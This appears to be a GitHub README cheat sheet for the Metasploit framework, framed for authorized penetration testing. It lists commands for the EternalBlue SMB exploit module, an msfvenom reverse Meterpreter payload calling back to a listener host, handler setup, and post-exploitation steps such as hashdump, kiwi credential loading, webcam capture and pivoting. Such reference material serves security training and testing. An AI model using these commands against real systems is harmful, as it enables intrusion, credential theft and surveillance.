# Metasploit Cheat Sheet

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> **Legal / Ethics Notice** — Metasploit is a powerful framework for vulnerability research and penetration testing. Use it only with explicit authorization (written permission) or within a controlled lab environment. Unauthorized use is illegal.

---

## Quick Start / Launch

```bash
# start msfconsole
$ msfconsole

# check installed version and consult Rapid7 release notes for updates
```

---

## Core msfconsole Commands

- Search modules (with useful filters):

```bash
msf6 > search <keyword>
msf6 > search platform:Windows type:exploit
msf6 > search author:hd
```

- Load an exploit / auxiliary / post module:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use auxiliary/scanner/portscan/tcp
```

- Module information:

```bash
msf6 exploit(...) > info           # detailed module information
msf6 exploit(...) > show options   # required and optional options
msf6 exploit(...) > show advanced  # advanced settings
msf6 exploit(...) > show missing   # show missing required options
```

- Settings and global options:

```bash
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set RPORT 445
msf6 > setg LHOST 10.0.0.5    # setg = global (useful across multiple modules)
msf6 > unset RHOSTS
```

- Running an exploit:

```bash
msf6 > exploit                 # run in the foreground (interactive)
msf6 > exploit -j              # run as a background job
msf6 > exploit -z              # often used to background; behavior depends on module
```

---

## msfvenom — payload generation (best practices)

- Basic example:

```bash
# reverse Meterpreter as a Windows executable
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
```

- Common options:
  - `-p` — payload (e.g., `windows/meterpreter/reverse_tcp`)
  - `LHOST` / `LPORT` — listener host/port
  - `-f` — format (`exe`, `elf`, `raw`, `ps1`, `asp`, `jar`, `macho`, etc.)
  - `-a` / `--platform` — architecture/platform (e.g., `-a x64 --platform windows`)
  - `-b` — badchars to exclude
  - `-i` / `-e` — iterations and encoder (note: encoders do not reliably bypass modern AV)
  - `-x template.exe` — use a template binary
  - Redirect output with `> file` to save the generated payload

- Encoders should be used with caution — they are not a guaranteed AV-evasion method and must be validated in a test environment.

---

## Multi/Handler (listeners)

```bash
# configure a handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false   # keep the handler running
msf6 exploit(multi/handler) > exploit -j
```

- Notes: `exploit/multi/handler` usually runs as a job. After a session connects, use `sessions -l` and `sessions -i <id>` to interact. If sessions drop unexpectedly, check `ExitOnSession` and running jobs.

---

## Meterpreter — common commands (summary)

- Help / system info:

```
meterpreter > help
meterpreter > sysinfo
```

- Filesystem:

```
meterpreter > pwd
meterpreter > ls
meterpreter > cd <dir>
meterpreter > download <file>
meterpreter > upload <file>
meterpreter > edit <file>
```

- Process management:

```
meterpreter > ps
meterpreter > migrate <pid>
meterpreter > getpid
meterpreter > getsystem     # attempt privilege escalation
meterpreter > kill <pid>
```

- Networking / pivoting:

```
meterpreter > ipconfig
meterpreter > route add 10.10.0.0 255.255.0.0 <session-id>
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
```

- Other useful actions:

```
meterpreter > screenshot
meterpreter > webcam_list; webcam_snap  # if supported by the payload
meterpreter > hashdump    # requires appropriate privileges
meterpreter > load kiwi   # load Kiwi (similar to mimikatz) when available
```

- Note: Some post-exploitation extensions require additional modules or privileges.

---

## Jobs & Sessions Management

```bash
# jobs
msf6 > jobs -l
msf6 > jobs -k <id>

# sessions
msf6 > sessions -l
msf6 > sessions -i <id>      # interact with a session
msf6 > session -i <id>       # alternate alias (depends on version)
meterpreter > background     # background the current session
```

---

## Database / workspace / automation

- Initialize the database (if using DB features):

```bash
# on some installations:
$ msfdb init
# or configure PostgreSQL and use db_connect per the docs
msf6 > db_status
msf6 > workspace -a lab1
msf6 > workspace lab1
```

- Import Nmap results:

```bash
msf6 > db_import nmap.xml
```

- Resource scripts for automation:

```bash
# create a script.rc with sequential commands, then:
$ msfconsole -r script.rc
```

- Automation / API: Metasploit exposes RPC/HTTP APIs for programmatic control and integration.

---

## Useful auxiliary modules (examples)

- TCP port scanner:

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.10.0/24
msf6 > run
```

- DNS enumeration:

```bash
msf6 > use auxiliary/gather/dns_enum
msf6 > set DOMAIN example.local
msf6 > run
```

- Simple servers (FTP / SOCKS):

```bash
msf6 > use auxiliary/server/ftp
msf6 > set FTPROOT /tmp/ftproot
msf6 > run

msf6 > use auxiliary/server/socks4
msf6 > run
```

---

## Writing modules / exploit development

- Metasploit provides documentation and templates for module authors. Review the module development guide and sample modules before writing new code.

---

## Best practices / technical notes

- Always test payloads and workflows in a controlled lab (VMs, isolated networks).
- Encoders are not a reliable AV-evasion technique — validate outputs in an appropriate test environment.
- Maintain an audit trail: log modules used, parameters, CVEs, and the exact steps for reporting and reproducibility.
- Keep Metasploit up to date (`msfupdate`, package updates, or Rapid7 installers) and monitor release notes for new modules and important fixes.

---

## Quick cheat list

```
search <term>
use <module>
info
show options
show payloads
show encoders
set <opt> <val>
setg <opt> <val>   # global
show missing
exploit -j
jobs -l
sessions -l
session -i <id>
db_status
workspace -a <name>
msfconsole -r script.rc
msfvenom -p <payload> LHOST=... LPORT=... -f exe > out.exe
```

---

## Changes made from the original
- Added a legal/ethics notice.
- Expanded msfvenom section with `-a`, `--platform`, `-x`, `-b` and a warning about encoders.
- Added `info`, `show missing`, `setg`, `workspace`, `db_status`, `msfdb`, and resource scripts (`msfconsole -r`).
- Clarified multi/handler usage and suggested `ExitOnSession false` to keep handlers alive.
- Improved formatting and consistency for GitHub Pages readability.

---

## Further reading
- Metasploit Framework documentation and release notes
- msfvenom documentation
- Metasploit module development guides

---
